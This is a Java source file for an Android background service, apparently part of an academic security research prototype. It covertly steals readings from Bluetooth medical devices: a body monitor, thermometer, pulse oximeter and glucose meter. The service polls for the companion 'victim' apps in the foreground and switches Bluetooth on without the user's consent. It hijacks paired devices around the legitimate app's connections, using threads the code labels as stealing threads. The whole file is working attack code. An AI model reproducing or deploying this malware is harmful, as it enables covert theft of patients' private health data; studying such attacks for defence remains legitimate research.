package edu.illinois.seclab.extDroid.passAttack;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.List;
import java.util.Set;
import java.util.UUID;

import android.app.ActivityManager;
import android.app.Service;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothSocket;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.ParcelUuid;
import android.util.Log;
import edu.illinois.seclab.extDroid.Preferences.Prefs;
import edu.illinois.seclab.extDroid.bghack.BGConnectThread;
import edu.illinois.seclab.extDroid.bghack.BloodGHackThread;
import edu.illinois.seclab.extDroid.bm.BMConnectThread;
import edu.illinois.seclab.extDroid.bm.BodyHackThread;
import edu.illinois.seclab.extDroid.pulsehack.POConnectThread;
import edu.illinois.seclab.extDroid.pulsehack.PulseHackThread;
import edu.illinois.seclab.extDroid.thermohack.THConnectThread;
import edu.illinois.seclab.extDroid.thermohack.ThermoHackThread;

/**
 * 
 * @author soteris demetriou
 *
 */
public class SneakyService extends Service{
	private static final String TAG = "SneakyService";
	
	/**
	 * CONNECTION MODE MULTIPLE
	 */
	public static final int CONNECT_MULTIPLE = 2;
	/**
	 * CONNECTION MODE ONCE
	 */
	public static final int CONNECT_ONCE = 1;
	
	/**
	 * MESSAGE FROM THERMOMETER STEALING THREAD: DATA CAPTURE COMPLETED EITHER SUCCESFULLY OR UNSUCCESFULLY
	 */
	public static final int GOT_TH_DATA = 1;
	/**
	 * MESSAGE FROM BODYMEDIA STEALING THREAD: DATA CAPTURE COMPLETED EITHER SUCCESFULLY OR UNSUCCESFULLY
	 */
	public static final int GOT_BM_DATA = 2;
	/**
	 * MESSAGE FROM PULSE OXYMETER STEALING THREAD: DATA CAPTURE COMPLETED EITHER SUCCESFULLY OR UNSUCCESFULLY
	 */
	public static final int GOT_PO_DATA = 3;
	/**
	 * MESSAGE FROM BLOOD GLUCOSE STEALING THREAD: DATA CAPTURE COMPLETED EITHER SUCCESFULLY OR UNSUCCESFULLY
	 */
	protected static final int GOT_BG_DATA = 4;
	/**
	 * MESSAGE FROM STEALING THREADS: CONNECTION WAS SUCCESFULL
	 */
	public static final int CONN_SUCCESS = 5;
	/**
	 * MESSAGE FROM STEALING THREADS: CONNECTION FAILED
	 */
	public static final int CONN_FAIL = 6;
	
	/**
	 * KEY TO RETRIEVE CONNECTION MESSAGES FROM STEALING THREADS
	 */
	public static final String CON_ONCE_LBL = "CONONCE";

	

	/**
	 * The context that this service is running
	 */
	private static Context ctx;
	/**
	 * Holds the package names of the victims. It might have not been initialized.
	 */
	String[] victims;
	//
	
	private THConnectThread th_conn_thread;
	public static ThermoHackThread thermoThread = null;
	//private final UUID uuid = UUID.fromString("00001101-0000-1000-8000-00805f9b34fb");

	
	private BMConnectThread bm_conn_thread;
	public static BodyHackThread bmThread = null;
	//private final UUID mUUID = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB");
	
	private POConnectThread po_conn_thread;
	public static PulseHackThread poThread = null;
	
	private BGConnectThread bg_conn_thread;
	public static BloodGHackThread bgThread = null;
	
	private boolean firstBMAttempt = true;
	private boolean firstTHAttempt = true;
	private boolean firstPOAttempt = true;
	private boolean firstBGAttempt = true;
	
	/**
	 * The connected device. It holds the connection status and package name.
	 */
	public ExtDevice extDevice;
	
	Handler api_handler, connect_handler;

	
	public static Handler sshandler;
	
	
	public static  BluetoothSocket socket = null;

	public static long POST_ATTACK_START_TIME = -1;
	
	/***********************************************************************************************/
	/***********************************************************************************************/
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
	public void onCreate(){		
		init(this);					
		setInMessageHandler();
	}	
	

	@Override
    public int onStartCommand(Intent intent, int flags, int startId) {
		Log.i(TAG, "**********************************");
        Log.i(TAG, "**********************************");
        Log.i(TAG, "Received start id " + startId + ": " + intent);
        Log.i(TAG, "**********************************");
        Log.i(TAG, "**********************************");
        
        
        //connect(SneakyService.DELAY);
        firstBMAttempt = true;
        firstTHAttempt = true;
        firstPOAttempt = true;
        firstBGAttempt = true;
        startAPI();
        ///startCONNECT(SneakyService.CONNECT_MULTIPLE);
        
        // We want this service to continue running until it is explicitly
        // stopped, so return sticky.
        return START_STICKY;
    }
	
	

	@Override
	public void onDestroy(){
		unregisterReceiver(mReceiver);
		
	}
	
	/***********************************************************************************************/
	/***********************************************************************************************/
	
	/**
	 * Do some initializations
	 */
	private void init(Context ctx) {
		// TODO Auto-generated method stub
		SneakyService.ctx = this;
		Prefs.connect_mode = SneakyService.CONNECT_ONCE;
		//SneakyService.connected = false;
		
		registerReceivers(ctx);
		setHandlers();
	}
	
	/**
	 * Listen for messages from Stealing Threads
	 */
	private void setInMessageHandler() {
		// TODO Auto-generated method stub
		SneakyService.sshandler = new Handler(){
	        public void handleMessage(Message msg){
	               
	                /* Get the incoming values associated with this message */
	                        //we shouldn't get this bundle every time - access statically?
	        	Bundle b = msg.getData();
	        	int connect_mode = -1;
	        	switch (msg.what) {
				case SneakyService.GOT_TH_DATA:					
					dataStolen();
					break;
				case SneakyService.GOT_BM_DATA:
					dataStolen();
					break;
				case SneakyService.GOT_PO_DATA:
					dataStolen();
					break;
				case SneakyService.GOT_BG_DATA:
					dataStolen();
					break;
				case SneakyService.CONN_SUCCESS:
					connect_mode = b.getInt(SneakyService.CON_ONCE_LBL);
					if(connect_mode == SneakyService.CONNECT_MULTIPLE){
						Log.i(TAG, "Connect Multiple success. Wait for disconnection");
						stopCONNECT();
					}
					else if(connect_mode == SneakyService.CONNECT_ONCE){
						//check id pre or post attack
						Log.i(TAG, "Connect Once succesful. Wait for disconnection to try again or do something else");
					}
					break;
				case SneakyService.CONN_FAIL:
					connect_mode = b.getInt(SneakyService.CON_ONCE_LBL);
					if(connect_mode == SneakyService.CONNECT_MULTIPLE){
						Log.i(TAG, "Connect Multiple failed. Wait for disconnection");
						///stopCONNECT(); if timelitmit reached
					}
					else if(connect_mode == SneakyService.CONNECT_ONCE){
						//check id pre or post attack
						Log.i(TAG, "Connect Once failed. Wait for disconnection to try again or do something else");
//						if(extDevice.getConStatus() == DeviceStatus.TRY_TO_CONNECT_BY_US){
//							
//						}
					}
					else{
						Log.i(TAG, "Connect failed. Wait for disconnection to try again or do something else");
					}
					break;
				default:
					break;
				}                   
	               
	        }
	    };
	}
	
	/***********************************************************************************************/
	/***********************************************************************************************/
	
	/**
	 * RegisterS receivers to listen for Bluetooth events broadcasts
	 * @param ctx This context
	 */
	private void registerReceivers(Context ctx) {
		IntentFilter filter1 = new IntentFilter(BluetoothDevice.ACTION_ACL_CONNECTED);
	    IntentFilter filter2 = new IntentFilter(BluetoothDevice.ACTION_ACL_DISCONNECT_REQUESTED);
	    IntentFilter filter3 = new IntentFilter(BluetoothDevice.ACTION_ACL_DISCONNECTED);
	    IntentFilter filter4 = new IntentFilter(BluetoothAdapter.ACTION_DISCOVERY_FINISHED);
	    IntentFilter filter5 = new IntentFilter(BluetoothDevice.ACTION_FOUND);
	    ctx.registerReceiver(mReceiver, filter1);
	    ctx.registerReceiver(mReceiver, filter2);
	    ctx.registerReceiver(mReceiver, filter3);
	    ctx.registerReceiver(mReceiver, filter4);
	    ctx.registerReceiver(mReceiver, filter5);
		
	}
	
	/***************************************************************************************************/
	/***********************************************************************************************/
	
	
	/**
	 * Create Handlers for polling techniques
	 */
	private void setHandlers() {
		// TODO Auto-generated method stub
		api_handler = new Handler();
		connect_handler = new Handler();
	}

	/******************************************************************************************/
	/******************************************************************************************/
	/**                              RUNNING APP POLLING HANDLER 						     **/
	/******************************************************************************************/
	/******************************************************************************************/
	
	/* API */
	Runnable api_handler_task = new Runnable() {
		
		@Override
		public void run() {
			Log.i(TAG, "api_handler_task run()");
			// TODO Auto-generated method stub
//			long now = System.currentTimeMillis();
//			long time_elapsed = now - MainActivity.previous_time;
//			Log.i(TAG, "Time since previous execution started: " + time_elapsed);		
//			MainActivity.previous_time = now;
			victims = new String[]{Prefs.BM_PACKAGE, Prefs.TH_PACKAGE, Prefs.PO_PACKAGE};
			if( isPackRunningInForeground(victims, SneakyService.ctx) ){
				//App is running - try to connect
				stopAPI();
				//if(!extDevice.getPackName().equals(Prefs.TH_PACKAGE)){
				
				//SneakyService.POST_ATTACK_START_TIME  = System.currentTimeMillis();
				//startCONNECT(SneakyService.CONNECT_ONCE);
				//
				//}
				if (((extDevice.getPackName() == Prefs.BM_PACKAGE) && (!firstBMAttempt)) 
						|| ((extDevice.getPackName() == Prefs.TH_PACKAGE) && (!firstTHAttempt)) 
						|| ((extDevice.getPackName() == Prefs.PO_PACKAGE) && (!firstPOAttempt))
						|| ((extDevice.getPackName() == Prefs.BG_PACKAGE) && (!firstBGAttempt))) {
					//SneakyService.POST_ATTACK_START_TIME  = System.currentTimeMillis();
					AttackStatus.PRE_ATTACK = true;
				    AttackStatus.POST_ATTACK = false;
					startCONNECT(SneakyService.CONNECT_ONCE);
				}
				
			}
			else{
				//Try again
				api_handler.postDelayed(api_handler_task, Prefs.TC2_DELAY);
			}
			//
		}
	};
	
	/**
	 * Starts polling for running applications
	 */
	void startAPI(){
		//MainActivity.previous_time = System.currentTimeMillis();
		Log.i(TAG, "startAPI");
		//extDevice = null;
		api_handler_task.run();
	}
	
	/**
	 * Stops polling for running applications
	 */
	void stopAPI(){
		api_handler.removeCallbacks(api_handler_task);
	}
	
	/******************************************************************************************/
	/******************************************************************************************/
	/**                         CHECK IF APP IS RUNNING IN FOREGROUND                        **/
	/******************************************************************************************/
	/******************************************************************************************/
	
	/**
	 * Returns true if the foreground running app is the victim app and sets the victim ID. \n
	 * If the victim app is not in the foreground it returns false
	 * @param packNames The array of candidate package names to check whether are running in the foreground
	 * @param ctx2 The Service Context
	 */
	private boolean isPackRunningInForeground(String[] packNames, Context ctx2) {
		// TODO Auto-generated method stub
		boolean victimInForeground = false;
        
        //MyApplication.getAppContext();
		//Process process = Runtime.getRuntime().exec("ps");
        	try {
				Thread.sleep(490);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
        	
            ActivityManager activity_manager = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningTaskInfo> taskInfos = activity_manager.getRunningTasks(1);
            
            ComponentName componentInfo = taskInfos.get(0).topActivity;
            Log.d(TAG, "CURRENT Activity ::"
                    + taskInfos.get(0).topActivity.getPackageName());
            
            if(componentInfo.getPackageName().equals(Prefs.BM_PACKAGE)){
            	Prefs.victim_id = Prefs.BODYMEDIA_ID;
            	if(extDevice.getPackName() != componentInfo.getPackageName()){
            		extDevice = new ExtDevice(Prefs.BM_PACKAGE, Prefs.BODYMEDIA_MAC_START, DeviceStatus.UNKNOWN);
            	}
            	victimInForeground = true;
            }
            else if(componentInfo.getPackageName().equals(Prefs.TH_PACKAGE)){
            	Prefs.victim_id = Prefs.THERMOMETER_ID;
            	if((extDevice == null) || (extDevice.getPackName() != componentInfo.getPackageName())){
            		extDevice = new ExtDevice(Prefs.TH_PACKAGE, Prefs.THERMOMETER_MAC_START, DeviceStatus.UNKNOWN);
            	}
            	
            	victimInForeground = true;
            }
            else if(componentInfo.getPackageName().equals(Prefs.PO_PACKAGE)){
            	Prefs.victim_id = Prefs.PULSE_OXYMETER_ID;
            	if((extDevice == null) || (extDevice.getPackName() != componentInfo.getPackageName())){
            		extDevice = new ExtDevice(Prefs.PO_PACKAGE, Prefs.PULSE_OXYMETER_MAC_START, DeviceStatus.UNKNOWN);
            	}
            	victimInForeground = true;
            }
            else if(componentInfo.getPackageName().equals(Prefs.BG_PACKAGE)){
            	Prefs.victim_id = Prefs.BLOOG_GLUCOSE_ID;
            	if((extDevice == null) || (extDevice.getPackName() != componentInfo.getPackageName())){
            		extDevice = new ExtDevice(Prefs.BG_PACKAGE, Prefs.BLOOD_GLUCOSE_MAC_START, DeviceStatus.UNKNOWN);
            	}
            	victimInForeground = true;
            }
            
                       
        
        return victimInForeground;
	}
	
	/******************************************************************************************/
	/******************************************************************************************/
	/**                         CHECK IF APP IS RUNNING  		                             **/
	/******************************************************************************************/
	/******************************************************************************************/
	
	/**
	 * Returns the pid of the running victim app and sets the victim ID. \n
	 * If no victim app is found it returns -1
	 * @param bmPackage The package to check whether is running
	 * @param ctx2 The Service Context
	 */
	private int isPackRunning(String[] packNames, Context ctx2) {
		// TODO Auto-generated method stub
		int pid = -1;
        
        //MyApplication.getAppContext();
		//Process process = Runtime.getRuntime().exec("ps");
        	try {
				Thread.sleep(490);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
        	
            ActivityManager activity_manager = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> procInfos = activity_manager.getRunningAppProcesses();
            
            for (ActivityManager.RunningAppProcessInfo procInfo : procInfos){
                    //Log.i(TAG, "procInfo: " + procInfo.pid + ", Name:" + procInfo.processName);
                    //
                    //if (procInfo.processName.equals(packName)){
                    if(Arrays.asList(packNames).contains(procInfo.processName)){
                            //found packName
                            pid = procInfo.pid;
                            Log.i(TAG, "Found one! procInfo: " + procInfo.pid + ", Name:" + procInfo.processName);
                            
                            //save victim's id
                            if(procInfo.processName.equals(Prefs.BM_PACKAGE)){
                            	Prefs.victim_id = Prefs.BODYMEDIA_ID;
                            	extDevice = new ExtDevice(Prefs.BM_PACKAGE, Prefs.BODYMEDIA_MAC_START, DeviceStatus.UNKNOWN);
                            }
                            else if(procInfo.processName.equals(Prefs.TH_PACKAGE)){
                            	Prefs.victim_id = Prefs.THERMOMETER_ID;
                            	extDevice = new ExtDevice(Prefs.TH_PACKAGE, Prefs.THERMOMETER_MAC_START, DeviceStatus.UNKNOWN);
                            }
                            else if(procInfo.processName.equals(Prefs.PO_PACKAGE)){
                            	Prefs.victim_id = Prefs.PULSE_OXYMETER_ID;
                            	extDevice = new ExtDevice(Prefs.PO_PACKAGE, Prefs.PULSE_OXYMETER_MAC_START, DeviceStatus.UNKNOWN);
                            }
                            else{
                            	pid = -1;
                            }
                            
                            break;
                    }
            }
        
        return pid;
	}

	/******************************************************************************************/
	/******************************************************************************************/
	/**                              CONNECT HANDLER 									     **/
	/******************************************************************************************/
	/******************************************************************************************/
	
	/* CONNECT */
	Runnable connect_handler_task = new Runnable() {
		
		@Override
		public void run() {
			// TODO Auto-generated method stub
			//long now = System.currentTimeMillis();
			//long time_elapsed = now - MainActivity.previous_time;
			//Log.i(TAG, "Time since previous execution started: " + time_elapsed);		
			//MainActivity.previous_time = now;
			
			read_env(SneakyService.CONNECT_MULTIPLE);
			connect_handler.postDelayed(connect_handler_task, Prefs.INTERVAL_CONNECT);
		}
		//
	};
	
	/**
	 * Starts connection effort(s).
	 * @param mode Connection mode. Once or multiple trials.
	 */
	void startCONNECT(int mode){
		//MainActivity.previous_time = System.currentTimeMillis();
		if (mode == SneakyService.CONNECT_ONCE){
			read_env(mode);
			//connect_handler_task.run();
		}
		else{
			connect_handler_task.run();
		}
		
	}
	
	/**
	 * Stops multiple connection efforts.
	 */
	void stopCONNECT(){
		connect_handler.removeCallbacks(connect_handler_task);
	}
	
	/******************************************************************************************/
	/******************************************************************************************/
	
	/**
	  * This method is responsible to determine if the environment is ready to initiate data collection
	 * @return 
	  */
	private Integer read_env(int mode) {
			// Get the BT Adapter
			BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
			if (mBluetoothAdapter == null) {
			    // Device does not support Bluetooth
				Log.e(TAG, "*********Device does not support Bluetooth*********");
			}
			
			
			if (!mBluetoothAdapter.isEnabled()) {
			    //Intent enableBtIntent = new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE);
			    //startActivityForResult(enableBtIntent, REQUEST_ENABLE_BT);
				mBluetoothAdapter.enable();
				Log.e(TAG, "*********Bluetooth is Enabled by us*********");				
				//mBluetoothAdapter.enable();
			}
			
			//capture(mBluetoothAdapter, Prefs.victim_id, mode);
			captureOld(mBluetoothAdapter, mode);
		
			return 1;
	}
	
	/******************************************************************************************/
	
	/**
	 * Tries to connect. If successful it steals data and sends them out! \n
	 * 
	 * @param mBluetoothAdapter
	 * @param mode The connection mode. It is either try multiple times or try once (currently set to try once by default)
	 */
	private void captureOld(BluetoothAdapter mBluetoothAdapter, int mode) {
		UUID muuid = null;
		//QUERY PAIRED DEVICES
		Set<BluetoothDevice> pairedDevices = mBluetoothAdapter.getBondedDevices();
		// If there are paired devices
		if (pairedDevices.size() > 0) {
		    // Loop through paired devices
		    for (BluetoothDevice device : pairedDevices) { 
		        //device.getName() 
		    	//device.getAddress());
		    	Log.i(TAG, "Device name: " + device.getName());
		    	Log.i(TAG, "Device address: " + device.getAddress());
		    	
		    	//TODO: find manufacturer's MAC
		    	if ( (device.getAddress().startsWith(Prefs.THERMOMETER_MAC_START) 
		    			&& (extDevice.getPackName() == Prefs.TH_PACKAGE)) ){
		    	
		    		for (ParcelUuid uuid :device.getUuids()){
		    			Log.d(TAG, uuid.toString());
		    			muuid = uuid.getUuid();
		    			break;
		    		}
		    		//
		    		
		    		//Toast.makeText(getApplicationContext(), "Bodymedia bluetooth device found!", Toast.LENGTH_LONG).show();
		    		Log.i(TAG, "Thermometer bluetooth device found: " + device.getAddress() + ". \nDevice->getName(): " + device.getName()
		    				);
		    		//TextView tv = (TextView) findViewById(R.id.ma_tv1);
		    		//tv.setText(device.getAddress());
		    		if (th_conn_thread != null){
		    			th_conn_thread.cancel();
		    		}
		    		th_conn_thread = new THConnectThread(device, extDevice, muuid, mBluetoothAdapter, mode);
		    		th_conn_thread.start();
		    		
		    		//We started capturing data. Let the service know that polling for environment
		    		// status in no longer needed
		    		//Message envStatus = new Message();
		    		//envStatus.what = EnvironmentCheck.EnvSTATUS;
		    		//Bundle bundle = new Bundle();
		    		//bundle.putInt(EnvREADYlabel, EnvREADY);
		    		//envStatus.setData(bundle);
                    //SneakyService.handler.sendMessage(envStatus);
		    		
		    		break;
		    	}
		    	else if ((device.getAddress().startsWith(Prefs.BODYMEDIA_MAC_START))
		    			&& (extDevice.getPackName() == Prefs.BM_PACKAGE)){
		    		for (ParcelUuid uuid :device.getUuids()){
		    			Log.d(TAG, uuid.toString());
		    			muuid = uuid.getUuid();
		    			break;
		    		}
		    		
		    		//Toast.makeText(getApplicationContext(), "Bodymedia bluetooth device found!", Toast.LENGTH_LONG).show();
		    		Log.i(TAG, "Bodymedia bluetooth device found: " + device.getAddress() + ". \nDevice->getName(): " + device.getName()
		    				);
		    		//TextView tv = (TextView) findViewById(R.id.ma_tv1);
		    		//tv.setText(device.getAddress());
		    		if (bm_conn_thread != null){
		    			bm_conn_thread.cancel();
		    		}
		    		bm_conn_thread = new BMConnectThread(device, extDevice, muuid, mBluetoothAdapter, mode);
		    		bm_conn_thread.start();
		    		
		    		break;
		    	}
		    	else if( (device.getName().startsWith(Prefs.PULSE_OXYMETER_DEV_NAME1) 
		    			|| device.getName().startsWith(Prefs.PULSE_OXYMETER_DEV_NAME2) )
		    			&& (extDevice.getPackName() == Prefs.PO_PACKAGE)){
		    		
		    		for (ParcelUuid uuid :device.getUuids()){
		    			Log.d(TAG, uuid.toString());
		    			muuid = uuid.getUuid();
		    			break;
		    		}
		    		
		    		//Toast.makeText(getApplicationContext(), "Bodymedia bluetooth device found!", Toast.LENGTH_LONG).show();
		    		Log.i(TAG, "Nonin bluetooth device found: " + device.getAddress() + ". \nDevice->getName(): " + device.getName()
		    				);
		    		//TextView tv = (TextView) findViewById(R.id.ma_tv1);
		    		//tv.setText(device.getAddress());
		    		if (po_conn_thread != null){
		    			po_conn_thread.cancel();
		    		}
		    		po_conn_thread = new POConnectThread(device, extDevice, muuid, mBluetoothAdapter, mode);
		    		po_conn_thread.start();
		    		
		    		break;
		    	}
		    	else if(device.getName().startsWith(Prefs.BLOOD_GLUCOSE_DEV_NAME) 
		    			&& (extDevice.getPackName() == Prefs.BG_PACKAGE)){
		    		
		    		for (ParcelUuid uuid :device.getUuids()){
		    			Log.d(TAG, uuid.toString());
		    			muuid = uuid.getUuid();
		    			break;
		    		}
		    		
		    		//Toast.makeText(getApplicationContext(), "Bodymedia bluetooth device found!", Toast.LENGTH_LONG).show();
		    		Log.i(TAG, "Blood Glucose device found: " + device.getAddress() + ". \nDevice->getName(): " + device.getName()
		    				);
		    		//TextView tv = (TextView) findViewById(R.id.ma_tv1);
		    		//tv.setText(device.getAddress());
		    		if (bg_conn_thread != null){
		    			bg_conn_thread.cancel();
		    		}
		    		bg_conn_thread = new BGConnectThread(device, extDevice, muuid, mBluetoothAdapter, mode);
		    		bg_conn_thread.start();
		    		
		    		break;
		    	}
		    	else{
		    		Log.e(TAG, "**********This is not our device!**********");
		    		//TODO: Poll connection
		    	}
		    }
		}
		
	}
		
	/******************************************************************************************/
	
	/**
	 * Data capture completed! Close socket. Update device state and start TC2 polling if the original device is not running
	 * in the foreground.
	 */
	private void dataStolen() {
		// TODO Auto-generated method stub
		//close socket
		
		//extDevice.setConStatus(DeviceStatus.DISCONNECTED_BY_US);
		
		
    	try {
    		Log.i(TAG, "We are closing the socket...");
    		extDevice.setConStatus(DeviceStatus.DISCONNECTED_BY_US);
    		Log.i("dataStolen", "extDevice.setConStatus(DeviceStatus.DISCONNECTED_BY_US)");
    		SneakyService.socket.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			Log.e(TAG, "Couldn't close the socket");
			e.printStackTrace();
		}catch (NullPointerException e) {
			// TODO Auto-generated catch block
			Log.e(TAG, "Socket is null!!!");
			e.printStackTrace();
		}

    	//SneakyService.connected = false;
        
       
        
        //start again if this is the post attack
    	//maybe the device has disconnected but the original app is still running. In this case the malicious app
    	//will perform post attack on the next disconnection

        if(AttackStatus.PRE_ATTACK){
        	Log.i("dataStolen", "Pre attack completed. Stop polling..wait on disconnect event");
        	stopAPI();
        	stopCONNECT();
        }
        else if(AttackStatus.POST_ATTACK){
        	Log.i("dataStolen", "Post attack completed. If app is not on the foreground start polling" +
        			" for the launch of the app.");
        	stopAPI();
        	stopCONNECT();
        	if(!isPackRunningInForeground(victims, SneakyService.ctx)){
            	startAPI();
            }
        }
	}
	
	

	/******************************************************************************************/
	/******************************************************************************************/
	/**                       BLUETOOTH EVENT RECEIVER 									     **/
	/******************************************************************************************/
	/******************************************************************************************/
	
	/**
	 * The BroadcastReceiver that listens for bluetooth broadcasts. \n
	 * If the vitctim device has disconnected and not because of us, then we try to connect once.
	 */
	private final BroadcastReceiver mReceiver = new BroadcastReceiver() {
		@Override
	    public void onReceive(Context context, Intent intent) {
			  String action = intent.getAction();
			  BluetoothDevice device = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);

			  if (BluetoothDevice.ACTION_FOUND.equals(action)) {
			           //Device found
			        	Log.i(TAG, "***********Device Found***********");
			  }
			  else if (BluetoothDevice.ACTION_ACL_CONNECTED.equals(action)) {
				  //Device is now connected
				  Log.i(TAG, "***********Device is connected!***********");
				  Log.i(TAG, "extDevice.getConStatus(): " + extDevice.getConStatus());
				  if ( device.getAddress().startsWith(extDevice.getMACAddressStart()) ){
					  	if((extDevice.getConStatus() != DeviceStatus.CONNECTED_BY_US) ){
					  			//&& (extDevice.getConStatus() != DeviceStatus.DISCONNECTED_BY_US)){
					  		extDevice.setConStatus(DeviceStatus.CONNECTED);
					  		Log.i(TAG, "extDevice.getConStatus(): " + extDevice.getConStatus());
					  	}
				  		//TODO: Stop TC3 if it is set to multiple trials
					  	//stopCONNECT();
				  }
				  
			        	
			  }
			  else if (BluetoothAdapter.ACTION_DISCOVERY_FINISHED.equals(action)) {
			  //Done searching
			        	Log.i(TAG, "***********Discovery Finished!***********");		        	
			        	
			  }
			  else if (BluetoothDevice.ACTION_ACL_DISCONNECT_REQUESTED.equals(action)) {
			           //Device is about to disconnect
			  }
			  else if (BluetoothDevice.ACTION_ACL_DISCONNECTED.equals(action)) {
			           //Device has disconnected
				  Log.i(TAG, "***********Device has disconnected!***********");
				  
				  if ( (device.getAddress().startsWith(extDevice.getMACAddressStart())) 
						  && (extDevice.getConStatus() != DeviceStatus.DISCONNECTED_BY_US )
						  && (extDevice.getConStatus() != DeviceStatus.CONNECTED_BY_US )){
					  	//POST ATTACK  - try to connect to the device
					    Log.i(TAG, "extDevice.getConStatus(): " + extDevice.getConStatus());
					    Log.i(TAG, "Victim device DISCONNECTED..try to connect once!");
					    
					    //TODO: check if not is package running to make sure this happens because of the or 
					    //app closing and not because of the external device disabling
					    
					    if(extDevice.getPackName() == Prefs.BM_PACKAGE){
					    	firstBMAttempt = false;
					    }
					    else if(extDevice.getPackName() == Prefs.TH_PACKAGE){
					    	firstTHAttempt = false;
					    }
					    else if(extDevice.getPackName() == Prefs.PO_PACKAGE){
					    	firstPOAttempt = false;
					    }
					    
					    extDevice.setConStatus(DeviceStatus.DISCONNECTED);
					    AttackStatus.PRE_ATTACK = false;
					    AttackStatus.POST_ATTACK = true;
					    
					    SneakyService.POST_ATTACK_START_TIME  = System.currentTimeMillis();
					    Log.i(TAG, "Start Connect: " + SneakyService.POST_ATTACK_START_TIME);
				  		startCONNECT(SneakyService.CONNECT_ONCE);
				  		//
				  }
				  else if(extDevice.getConStatus() == DeviceStatus.CONNECTED_BY_US){
					  Log.i(TAG, "Connection was by us");
					  extDevice.setConStatus(DeviceStatus.DISCONNECTED_BY_US);
					  th_conn_thread.cancel();
					  thermoThread.cancel();
					  bm_conn_thread.cancel();
					  bmThread.cancel();
				  }
			        	
			        	
			  }
			       
		}
	};

}
